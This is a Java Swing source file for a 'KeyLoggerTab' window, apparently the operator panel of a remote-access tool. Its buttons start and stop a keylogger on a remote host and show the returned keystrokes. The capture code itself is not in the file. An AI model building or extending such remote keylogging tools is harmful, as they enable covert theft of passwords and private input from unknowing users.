package Tabs;


import javax.swing.JInternalFrame;
import java.awt.Color;
import javax.swing.JFrame;
import javax.swing.JScrollPane;

import Process.ListProcess;
import Process.ProcessKill;
import Process.ProcessStart;

import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.awt.event.ActionEvent;
import javax.swing.JTextPane;
import javax.swing.JTextField;
import javax.swing.JLabel;
import javax.swing.JOptionPane;

import java.awt.Font;
import javax.swing.JPanel;
import javax.swing.SwingConstants;

import KeyLogger.KeyLoggerStart;
import KeyLogger.KeyLoggerStop;



public class KeyLoggerTab extends JInternalFrame {
	private String host = "";
	private int port;
	private boolean isRecord = false;
	private final JTextPane textPane = new JTextPane();
	
	public KeyLoggerTab(String host,int port) {
		this.host = host;
		this.port = port;
		setBorder(null);
		setResizable(true);
		setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		getContentPane().setBackground(new Color(255, 255, 255));
		setBounds(100, 100, 600, 400);
		getContentPane().setLayout(null);
		textPane.setBounds(23, 93, 567, 525);
		
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setBounds(23, 106, 567, 257);
		scrollPane.setViewportView(textPane);
		getContentPane().add(scrollPane);
		
		JButton btnStart = new JButton("START KEY LOGGER");
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if(!isRecord) {
					KeyLoggerStart keyLoggerStart = new KeyLoggerStart(host, port);
					keyLoggerStart.sendRequest();
					isRecord = true;
				}
			}
		});
		btnStart.setBounds(26, 25, 152, 44);
		getContentPane().add(btnStart);
		
		JButton btnStop = new JButton("STOP KEY LOGGER");
		btnStop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if(isRecord) {
					KeyLoggerStop keyLoggerStop = new KeyLoggerStop(host, port);
					keyLoggerStop.sendRequest();
					String data = (String) keyLoggerStop.getResponseData();
					textPane.setText(data);
					isRecord = false;
				}
			}
		});
		btnStop.setBounds(213, 25, 152, 44);
		getContentPane().add(btnStop);
		
		JPanel panel = new JPanel();
		panel.setBounds(461, 25, 47, 44);
		getContentPane().add(panel);
		
		JLabel lblNewLabel = new JLabel("Record");
		lblNewLabel.setFont(new Font("Tahoma", Font.PLAIN, 13));
		lblNewLabel.setHorizontalAlignment(SwingConstants.CENTER);
		lblNewLabel.setBounds(461, 10, 45, 13);
		getContentPane().add(lblNewLabel);
		setVisible(true);
		
	}
}
